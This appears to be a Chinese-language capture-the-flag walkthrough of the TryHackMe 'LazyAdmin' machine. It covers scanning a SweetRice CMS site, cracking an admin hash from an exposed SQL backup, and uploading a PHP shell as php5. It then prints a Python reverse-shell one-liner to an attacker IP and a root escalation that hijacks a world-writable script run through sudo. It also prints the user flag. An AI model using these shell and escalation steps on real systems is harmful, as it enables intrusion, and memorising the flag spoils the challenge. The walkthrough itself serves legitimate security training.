LazyAdmin

Easy linux machine to practice your skills

端口扫描

序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码
1 10.48.130.120 80 HTTP http://10.48.130.120:80 Apache2 Ubuntu Default Page: It works Apache2 默认页, Apache2Debian默认页, Apache-HTTP-Server-Ubuntu, apache2-ubuntu默认页面, Apache-HTTP-Server/2.4.18, Apache-Web-Server, Apache/2.4.18 (Ubuntu) 200
2 10.48.130.120 22 SSH 10.48.130.120:22 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 0

目录扫描得到 /content，访问是一个由 SweetRice CMS 构建的网站，但是没有其他信息

继续目录扫描，首先得到 /content/as 目录，访问是一个登录页面，但是不知道密码，搜索相关漏洞，存在任意密码修改，但是不知道相关邮箱，只好作罢

同样还有 /content/inc 目录，是一个文件目录，其中 /content/inc/lastest.txt 得知 cms 版本为 1.5.1

还有一个 /content/inc/mysql_backup，里面有一个 sql 文件，下载后在里面找到账号密码

's:5:"admin";s:7:"manager";s:6:"passwd";s:32:"42f749ade7f9e195bf475f37a44cafcb";'

密码 md5 解密得到 Password123

manager

Password123

使用上述密码登录后台，在后台找到一个文件上传的地方，上传单文件 php shell 被拦截，修改后缀为 php5 成功上传

浏览器访问该文件

www-data@THM-Chal:…/content/attachment# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@THM-Chal:/home/itguy# cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}

由于是网页环境，利用 python 反弹到攻击机

python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.206.169",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

执行 sudo -l，可以无密码以 root 权限执行 /usr/bin/perl /home/itguy/backup.pl

www-data@THM-Chal:/home/itguy$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

查看 backup.pl 文件以及权限，拥有执行权限但是没有修改权限

该命令会运行另外一个文件

www-data@THM-Chal:/home/itguy$ cat backup.pl
cat backup.pl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");

www-data@THM-Chal:/home/itguy$ ls -al backup.pl
-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl

查看 /etc/copy.sh 权限，可以进行修改

将提权语句写入该文件

www-data@THM-Chal:/home/itguy$ ls -la /etc/copy.sh
ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh

www-data@THM-Chal:/home/itguy$ echo '#!/bin/sh' > /etc/copy.sh
echo '#!/bin/sh' > /etc/copy.sh

www-data@THM-Chal:/home/itguy$ echo '/bin/bash -p' >> /etc/copy.sh
echo '/bin/bash -p' >> /etc/copy.sh

运行直接提权

www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
sudo /usr/bin/perl /home/itguy/backup.pl
id
uid=0(root) gid=0(root) groups=0(root)
